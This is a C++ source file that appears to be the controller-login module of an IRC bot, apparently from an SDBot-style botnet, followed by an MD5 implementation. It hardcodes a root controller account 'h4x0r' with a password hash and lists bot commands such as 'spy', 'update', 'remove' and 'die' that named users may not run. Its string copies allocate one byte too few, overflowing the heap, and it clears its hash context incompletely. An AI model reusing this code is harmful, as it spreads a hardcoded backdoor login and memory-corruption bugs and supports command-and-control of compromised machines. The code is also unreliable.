#include <windows.h>
#include <string.h>
#include "../../Inc/client.h"
#include "../../Inc/SDX.h"

#pragma warning(disable:4244)

user_list_t *ulStart;
login_list_t *llStart;

void loginInit();
void loginShutdown();
void MD5_Get (char *, char *);

void loginTest()
{
	loginInit();
}

void loginInit()
{
	ulStart = new user_list_t; ulStart->next = NULL;
	llStart = new login_list_t; llStart->next = NULL;

	AddUser("h4x0r", "c81a69201b842abd86afce71f25cf323", "", "", "root", 1, ulStart);
	AddBadFunc("die:disconnect:prefix", FindUser("h4x0r", ulStart));
/*
	AddBadFunc("spy", FindUser("Ago", ulStart));
	AddBadFunc("die:remove:spy", FindUser("Fuknsuk", ulStart));
	AddBadFunc("update:die:remove:server:spy", FindUser("Darke", ulStart));
	AddBadFunc("update:die:remove:server:spy", FindUser("P_o_Grom", ulStart));
	AddBadFunc("update:die:remove:server:spy", FindUser("Zarka", ulStart));*/
}

void loginShutdown()
{/*
	DelBadFunc("spy", FindUser("Ago", ulStart));
	DelBadFunc("die:remove:spy", FindUser("Fuknsuk", ulStart));
	DelBadFunc("update:die:remove:server:spy", FindUser("Darke", ulStart));
	DelBadFunc("update:die:remove:server:spy", FindUser("P_o_Grom", ulStart));
	DelBadFunc("update:die:remove:server:spy", FindUser("Zarka", ulStart));*/
	
	DelUser("h4x0r", ulStart);
	/*DelUser("Fuknsuk", ulStart);
	DelUser("Darke", ulStart);
	DelUser("P_o_Grom", ulStart);
	DelUser("Zarka", ulStart);*/
}

user_list_t *FindUser(const char *username, const user_list_t *start)
{	if(!username) return NULL;
	user_list_t *ulTemp = (user_list_t*)start->next;
	while(ulTemp) {
		login_list_t *llTemp = FindLogin(username, llStart);
		if(!strcmp(ulTemp->username, username) || llTemp)
			return ulTemp;
		ulTemp = ulTemp->next;
	}
	return NULL; }

login_list_t *FindLogin(const char *irc_username, const login_list_t *start)
{	if(!irc_username) return NULL;
	login_list_t *llTemp = (login_list_t*)start->next;
	while(llTemp) {
		if(!strcmp(llTemp->irc_username, irc_username)) return llTemp;
		llTemp = llTemp->next;
	}
	return NULL; }

func_list_t *FindFunc(const char *funcname, const func_list_t *start)
{	if(!funcname) return NULL;
	func_list_t *flTemp = (func_list_t*)start->next;
	while(flTemp) {
		if(!strcmp(flTemp->funcname, funcname)) return flTemp;
		flTemp = flTemp->next;
	}
	return NULL; }

bool CheckPassword(char *password, user_list_t *user)
{	char md5[256];
	MD5_Get(password, md5);
	if(!strcmp(user->password, md5)) return true;
	return false; }

bool CheckBadFunc(char *funcname, user_list_t *user)
{	if(FindFunc(funcname, user->deny)) return true;
	return false; }

void AddBadFunc(char *funcname, user_list_t *user)
{	char *token = strtok(funcname, ":");

	while(token != NULL )
	{	func_list_t *flTemp = user->deny;
		while(flTemp->next) { flTemp = flTemp->next; }
		flTemp->next = new func_list_t;
		flTemp = flTemp->next;
		flTemp->funcname = (char*)malloc(strlen(token));
		strcpy(flTemp->funcname, token);
		flTemp->next = NULL;
		token = strtok(NULL, ":"); } }

bool AddLogin(char *username, char *password, char *irc_username, user_list_t *start, login_list_t *lstart)
{	if(FindLogin(irc_username, lstart)) return false;
	user_list_t *ulTemp = FindUser(username, start);
	if(ulTemp) if(CheckPassword(password, ulTemp)) {
		login_list_t *llTemp = lstart;
		while(llTemp->next) { llTemp = llTemp->next; }
		llTemp->next = new login_list_t;
		llTemp = llTemp->next;
		llTemp->user = ulTemp;
		llTemp->username = (char*)malloc(strlen(username));
		strcpy(llTemp->username, username);
		llTemp->irc_username = (char*)malloc(strlen(irc_username));
		strcpy(llTemp->irc_username, irc_username);
		llTemp->next = NULL;
		return true;
	}
	return false;
}

void AddUser(char *username, char *password, char *hostmask, char *identd, char *logincmd, int maxlogins, user_list_t *start)
{
	user_list_t *ulTemp = start;
	while(ulTemp->next) { ulTemp = ulTemp->next; }
	ulTemp->next = new user_list_t;
	ulTemp = ulTemp->next;
	ulTemp->deny = new func_list_t; ulTemp->deny->next = NULL;
	ulTemp->username = (char*)malloc(strlen(username));
	strcpy(ulTemp->username, username);
	ulTemp->password = (char*)malloc(strlen(password));
	strcpy(ulTemp->password, password);
	ulTemp->hostmask = (char*)malloc(strlen(hostmask));
	strcpy(ulTemp->hostmask, hostmask);
	ulTemp->identd = (char*)malloc(strlen(identd));
	strcpy(ulTemp->identd, identd);
	ulTemp->logincmd = (char*)malloc(strlen(logincmd));
	strcpy(ulTemp->logincmd, logincmd);
	ulTemp->next = NULL;
}

bool DelBadFunc_int(char *funcname, user_list_t *user)
{
	func_list_t *flTemp = user->deny->next;
	func_list_t *flPrev = NULL;
	while(flTemp) {
		if(!strcmp(flTemp->funcname, funcname)) {
			if(flPrev) flPrev->next = flTemp->next; else user->deny->next = flTemp->next;
//			free(flTemp->funcname);
			delete flTemp;
			return true;
		}
		flPrev = flTemp;
		flTemp = flTemp->next;
	}
	return false;
}

bool DelBadFunc(char *funcname, user_list_t *user)
{	char *token = strtok(funcname, ":");

	while(token != NULL )
	{
		DelBadFunc_int(token, user);
		token = strtok(NULL, ":"); } 
	return true; }

bool DelLogin(char *username, char *irc_username, login_list_t *lstart)
{
	login_list_t *llTemp = lstart->next;
	login_list_t *llPrev = NULL;
	while(llTemp) {
		if(!strcmp(llTemp->username, username) || !strcmp(llTemp->irc_username, irc_username)) {
			if(llPrev) llPrev->next = llTemp->next; else llStart->next = llTemp->next;
//			free(llTemp->username);
//			free(llTemp->irc_username);
			delete llTemp;
			return true;
		}
		llPrev = llTemp;
		llTemp = llTemp->next;
	}
	return false;
}

bool DelUser(char *username, user_list_t *start)
{
	user_list_t *ulTemp = start->next;
	user_list_t *ulPrev = NULL;
	while(ulTemp) {
		if(!strcmp(ulTemp->username, username)) {
			if(ulPrev) ulPrev->next = ulTemp->next; else ulStart->next = ulTemp->next;
//			free(ulTemp->username);
//			free(ulTemp->hostmask);
//			free(ulTemp->identd);
//			free(ulTemp->logincmd);
//			free(ulTemp->password);
			delete ulTemp->deny;
			delete ulTemp;
			return true;
		}
		ulPrev = ulTemp;
		ulTemp = ulTemp->next;
	}
	return false;
}

// MD5 Start
typedef unsigned long MD5_u32plus;

typedef struct {
	MD5_u32plus lo, hi;
	MD5_u32plus a, b, c, d;
	unsigned char buffer[64];
	MD5_u32plus block[16];
} MD5_CTX;

/*
 * The basic MD5 functions.
 *
 * F is optimized compared to its RFC 1321 definition just like in Colin
 * Plumb's implementation.
 */
#define F(x, y, z)			((z) ^ ((x) & ((y) ^ (z))))
#define G(x, y, z)			((y) ^ ((z) & ((x) ^ (y))))
#define H(x, y, z)			((x) ^ (y) ^ (z))
#define I(x, y, z)			((y) ^ ((x) | ~(z)))

/*
 * The MD5 transformation for all four rounds.
 */
#define STEP(f, a, b, c, d, x, t, s) \
	(a) += f((b), (c), (d)) + (x) + (t); \
	(a) = (((a) << (s)) | (((a) & 0xffffffff) >> (32 - (s)))); \
	(a) += (b);

/*
 * SET reads 4 input bytes in little-endian byte order and stores them
 * in a properly aligned word in host byte order.
 *
 * The check for little-endian architectures which tolerate unaligned
 * memory accesses is just an optimization.  Nothing will break if it
 * doesn't work.
 */
#if defined(__i386__) || defined(__vax__)
#define SET(n) \
	(*(MD5_u32plus *)&ptr[(n) * 4])
#define GET(n) \
	SET(n)
#else
#define SET(n) \
	(ctx->block[(n)] = \
	(MD5_u32plus)ptr[(n) * 4] | \
	((MD5_u32plus)ptr[(n) * 4 + 1] << 8) | \
	((MD5_u32plus)ptr[(n) * 4 + 2] << 16) | \
	((MD5_u32plus)ptr[(n) * 4 + 3] << 24))
#define GET(n) \
	(ctx->block[(n)])
#endif

/*
 * This processes one or more 64-byte data blocks, but does NOT update
 * the bit counters.  There're no alignment requirements.
 */
static unsigned char *body(MD5_CTX *ctx, unsigned char *data, unsigned long size)
{
	unsigned char *ptr;
	MD5_u32plus a, b, c, d;
	MD5_u32plus saved_a, saved_b, saved_c, saved_d;

	ptr = data;

	a = ctx->a;
	b = ctx->b;
	c = ctx->c;
	d = ctx->d;

	do {
		saved_a = a;
		saved_b = b;
		saved_c = c;
		saved_d = d;

/* Round 1 */
		STEP(F, a, b, c, d, SET(0), 0xd76aa478, 7)
		STEP(F, d, a, b, c, SET(1), 0xe8c7b756, 12)
		STEP(F, c, d, a, b, SET(2), 0x242070db, 17)
		STEP(F, b, c, d, a, SET(3), 0xc1bdceee, 22)
		STEP(F, a, b, c, d, SET(4), 0xf57c0faf, 7)
		STEP(F, d, a, b, c, SET(5), 0x4787c62a, 12)
		STEP(F, c, d, a, b, SET(6), 0xa8304613, 17)
		STEP(F, b, c, d, a, SET(7), 0xfd469501, 22)
		STEP(F, a, b, c, d, SET(8), 0x698098d8, 7)
		STEP(F, d, a, b, c, SET(9), 0x8b44f7af, 12)
		STEP(F, c, d, a, b, SET(10), 0xffff5bb1, 17)
		STEP(F, b, c, d, a, SET(11), 0x895cd7be, 22)
		STEP(F, a, b, c, d, SET(12), 0x6b901122, 7)
		STEP(F, d, a, b, c, SET(13), 0xfd987193, 12)
		STEP(F, c, d, a, b, SET(14), 0xa679438e, 17)
		STEP(F, b, c, d, a, SET(15), 0x49b40821, 22)

/* Round 2 */
		STEP(G, a, b, c, d, GET(1), 0xf61e2562, 5)
		STEP(G, d, a, b, c, GET(6), 0xc040b340, 9)
		STEP(G, c, d, a, b, GET(11), 0x265e5a51, 14)
		STEP(G, b, c, d, a, GET(0), 0xe9b6c7aa, 20)
		STEP(G, a, b, c, d, GET(5), 0xd62f105d, 5)
		STEP(G, d, a, b, c, GET(10), 0x02441453, 9)
		STEP(G, c, d, a, b, GET(15), 0xd8a1e681, 14)
		STEP(G, b, c, d, a, GET(4), 0xe7d3fbc8, 20)
		STEP(G, a, b, c, d, GET(9), 0x21e1cde6, 5)
		STEP(G, d, a, b, c, GET(14), 0xc33707d6, 9)
		STEP(G, c, d, a, b, GET(3), 0xf4d50d87, 14)
		STEP(G, b, c, d, a, GET(8), 0x455a14ed, 20)
		STEP(G, a, b, c, d, GET(13), 0xa9e3e905, 5)
		STEP(G, d, a, b, c, GET(2), 0xfcefa3f8, 9)
		STEP(G, c, d, a, b, GET(7), 0x676f02d9, 14)
		STEP(G, b, c, d, a, GET(12), 0x8d2a4c8a, 20)

/* Round 3 */
		STEP(H, a, b, c, d, GET(5), 0xfffa3942, 4)
		STEP(H, d, a, b, c, GET(8), 0x8771f681, 11)
		STEP(H, c, d, a, b, GET(11), 0x6d9d6122, 16)
		STEP(H, b, c, d, a, GET(14), 0xfde5380c, 23)
		STEP(H, a, b, c, d, GET(1), 0xa4beea44, 4)
		STEP(H, d, a, b, c, GET(4), 0x4bdecfa9, 11)
		STEP(H, c, d, a, b, GET(7), 0xf6bb4b60, 16)
		STEP(H, b, c, d, a, GET(10), 0xbebfbc70, 23)
		STEP(H, a, b, c, d, GET(13), 0x289b7ec6, 4)
		STEP(H, d, a, b, c, GET(0), 0xeaa127fa, 11)
		STEP(H, c, d, a, b, GET(3), 0xd4ef3085, 16)
		STEP(H, b, c, d, a, GET(6), 0x04881d05, 23)
		STEP(H, a, b, c, d, GET(9), 0xd9d4d039, 4)
		STEP(H, d, a, b, c, GET(12), 0xe6db99e5, 11)
		STEP(H, c, d, a, b, GET(15), 0x1fa27cf8, 16)
		STEP(H, b, c, d, a, GET(2), 0xc4ac5665, 23)

/* Round 4 */
		STEP(I, a, b, c, d, GET(0), 0xf4292244, 6)
		STEP(I, d, a, b, c, GET(7), 0x432aff97, 10)
		STEP(I, c, d, a, b, GET(14), 0xab9423a7, 15)
		STEP(I, b, c, d, a, GET(5), 0xfc93a039, 21)
		STEP(I, a, b, c, d, GET(12), 0x655b59c3, 6)
		STEP(I, d, a, b, c, GET(3), 0x8f0ccc92, 10)
		STEP(I, c, d, a, b, GET(10), 0xffeff47d, 15)
		STEP(I, b, c, d, a, GET(1), 0x85845dd1, 21)
		STEP(I, a, b, c, d, GET(8), 0x6fa87e4f, 6)
		STEP(I, d, a, b, c, GET(15), 0xfe2ce6e0, 10)
		STEP(I, c, d, a, b, GET(6), 0xa3014314, 15)
		STEP(I, b, c, d, a, GET(13), 0x4e0811a1, 21)
		STEP(I, a, b, c, d, GET(4), 0xf7537e82, 6)
		STEP(I, d, a, b, c, GET(11), 0xbd3af235, 10)
		STEP(I, c, d, a, b, GET(2), 0x2ad7d2bb, 15)
		STEP(I, b, c, d, a, GET(9), 0xeb86d391, 21)

		a += saved_a;
		b += saved_b;
		c += saved_c;
		d += saved_d;

		ptr += 64;
	} while (size -= 64);

	ctx->a = a;
	ctx->b = b;
	ctx->c = c;
	ctx->d = d;

	return ptr;
}

void MD5_Init(MD5_CTX *ctx)
{
	ctx->a = 0x67452301;
	ctx->b = 0xefcdab89;
	ctx->c = 0x98badcfe;
	ctx->d = 0x10325476;

	ctx->lo = 0;
	ctx->hi = 0;
}

void MD5_Update(MD5_CTX *ctx, unsigned char *data, unsigned long size)
{
	MD5_u32plus saved_lo;
	unsigned long used, free;

	saved_lo = ctx->lo;
	if ((ctx->lo = (saved_lo + size) & 0x1fffffff) < saved_lo)
		ctx->hi++;
	ctx->hi += size >> 29;

	used = saved_lo & 0x3f;

	if (used) {
		free = 64 - used;

		if (size < free) {
			memcpy(&ctx->buffer[used], data, size);
			return;
		}

		memcpy(&ctx->buffer[used], data, free);
		(unsigned char *)data += free;
		size -= free;
		body(ctx, ctx->buffer, 64);
	}

	if (size >= 64) {
		data = body(ctx, data, size & ~(unsigned long)0x3f);
		size &= 0x3f;
	}

	memcpy(ctx->buffer, data, size);
}

void MD5_Final(unsigned char *result, MD5_CTX *ctx)
{
	unsigned long used, free;

	used = ctx->lo & 0x3f;

	ctx->buffer[used++] = 0x80;

	free = 64 - used;

	if (free < 8) {
		memset(&ctx->buffer[used], 0, free);
		body(ctx, ctx->buffer, 64);
		used = 0;
		free = 64;
	}

	memset(&ctx->buffer[used], 0, free - 8);

	ctx->lo <<= 3;
	ctx->buffer[56] = ctx->lo;
	ctx->buffer[57] = ctx->lo >> 8;
	ctx->buffer[58] = ctx->lo >> 16;
	ctx->buffer[59] = ctx->lo >> 24;
	ctx->buffer[60] = ctx->hi;
	ctx->buffer[61] = ctx->hi >> 8;
	ctx->buffer[62] = ctx->hi >> 16;
	ctx->buffer[63] = ctx->hi >> 24;

	body(ctx, ctx->buffer, 64);

	result[0] = ctx->a;
	result[1] = ctx->a >> 8;
	result[2] = ctx->a >> 16;
	result[3] = ctx->a >> 24;
	result[4] = ctx->b;
	result[5] = ctx->b >> 8;
	result[6] = ctx->b >> 16;
	result[7] = ctx->b >> 24;
	result[8] = ctx->c;
	result[9] = ctx->c >> 8;
	result[10] = ctx->c >> 16;
	result[11] = ctx->c >> 24;
	result[12] = ctx->d;
	result[13] = ctx->d >> 8;
	result[14] = ctx->d >> 16;
	result[15] = ctx->d >> 24;

	memset(ctx, 0, sizeof(ctx));
}

void MD5_Get (char *str, char *dest)
{
	MD5_CTX ctx;
	char md5str[33], *r;
	unsigned char digest[16];
	int i;
	md5str[0] = 0;
	MD5_Init(&ctx);
	MD5_Update(&ctx, (unsigned char*)str, lstrlen(str));
	MD5_Final(digest, &ctx);
	for (i = 0, r = md5str; i < 16; i++, r += 2)
		wsprintf(r, "%02x", digest[i]);
	*r = 0;

	strcpy(dest, md5str);
}